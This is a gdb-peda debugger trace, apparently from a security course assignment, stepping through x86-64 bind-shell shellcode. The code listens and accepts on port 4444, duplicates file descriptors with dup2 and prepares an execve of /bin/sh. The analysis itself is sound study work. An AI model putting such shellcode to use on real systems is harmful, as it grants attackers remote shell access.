0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601083 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x32 ('2')
RBX: 0x0 
RCX: 0x601081 --> 0xf63148050f58326a 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601084 --> 0x582b6af63148050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107f <code+31>:	syscall 
   0x601081 <code+33>:	push   0x32
   0x601083 <code+35>:	pop    rax
=> 0x601084 <code+36>:	syscall 
   0x601086 <code+38>:	xor    rsi,rsi
   0x601089 <code+41>:	push   0x2b
   0x60108b <code+43>:	pop    rax
   0x60108c <code+44>:	syscall
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601084 in code ()
gdb-peda$ 
















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601086 --> 0x50f582b6af63148 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601086 --> 0x50f582b6af63148 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601081 <code+33>:	push   0x32
   0x601083 <code+35>:	pop    rax
   0x601084 <code+36>:	syscall 
=> 0x601086 <code+38>:	xor    rsi,rsi
   0x601089 <code+41>:	push   0x2b
   0x60108b <code+43>:	pop    rax
   0x60108c <code+44>:	syscall 
   0x60108e <code+46>:	xchg   rdi,rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601086 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601086 --> 0x50f582b6af63148 
RDX: 0x10 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601089 --> 0x6a9748050f582b6a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601083 <code+35>:	pop    rax
   0x601084 <code+36>:	syscall 
   0x601086 <code+38>:	xor    rsi,rsi
=> 0x601089 <code+41>:	push   0x2b
   0x60108b <code+43>:	pop    rax
   0x60108c <code+44>:	syscall 
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601089 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601086 --> 0x50f582b6af63148 
RDX: 0x10 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x2b ('+')
RIP: 0x60108b --> 0x5e036a9748050f58 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601084 <code+36>:	syscall 
   0x601086 <code+38>:	xor    rsi,rsi
   0x601089 <code+41>:	push   0x2b
=> 0x60108b <code+43>:	pop    rax
   0x60108c <code+44>:	syscall 
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x2b ('+')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060108b in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2b ('+')
RBX: 0x0 
RCX: 0x601086 --> 0x50f582b6af63148 
RDX: 0x10 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60108c --> 0x485e036a9748050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601086 <code+38>:	xor    rsi,rsi
   0x601089 <code+41>:	push   0x2b
   0x60108b <code+43>:	pop    rax
=> 0x60108c <code+44>:	syscall 
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
Guessed arguments:
arg[0]: 0x3 
arg[1]: 0x0 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060108c in code ()
gdb-peda$ 














[----------------------------------registers-----------------------------------]
RAX: 0x4 
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60108e --> 0xceff485e036a9748 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601089 <code+41>:	push   0x2b
   0x60108b <code+43>:	pop    rax
   0x60108c <code+44>:	syscall 
=> 0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060108e in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601090 --> 0x216aceff485e036a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60108b <code+43>:	pop    rax
   0x60108c <code+44>:	syscall 
   0x60108e <code+46>:	xchg   rdi,rax
=> 0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601090 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x3 
RIP: 0x601092 --> 0xf58216aceff485e 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60108c <code+44>:	syscall 
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
=> 0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x3 
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601092 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x3 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601093 --> 0x50f58216aceff48 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
=> 0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601093 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601096 --> 0x6af675050f58216a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
=> 0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601096 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x21 ('!')
RIP: 0x601098 --> 0x583b6af675050f58 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
=> 0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x21 ('!')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601098 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x0 
RCX: 0x60108e --> 0xceff485e036a9748 
RDX: 0x10 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601099 --> 0x99583b6af675050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
=> 0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq
Guessed arguments:
arg[0]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601099 in code ()
gdb-peda$ 















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60109b --> 0xbb4899583b6af675 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
=> 0x60109b <code+59>:	jne    0x601093 <code+51>
 | 0x60109d <code+61>:	push   0x3b
 | 0x60109f <code+63>:	pop    rax
 | 0x6010a0 <code+64>:	cdq
 | 0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
 |->   0x601093 <code+51>:	dec    rsi
       0x601096 <code+54>:	push   0x21
       0x601098 <code+56>:	pop    rax
       0x601099 <code+57>:	syscall
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060109b in code ()
gdb-peda$ 












[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x2 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601093 --> 0x50f58216aceff48 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
=> 0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601093 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601096 --> 0x6af675050f58216a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
=> 0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601096 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x21 ('!')
RIP: 0x601098 --> 0x583b6af675050f58 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
=> 0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x21 ('!')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601098 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
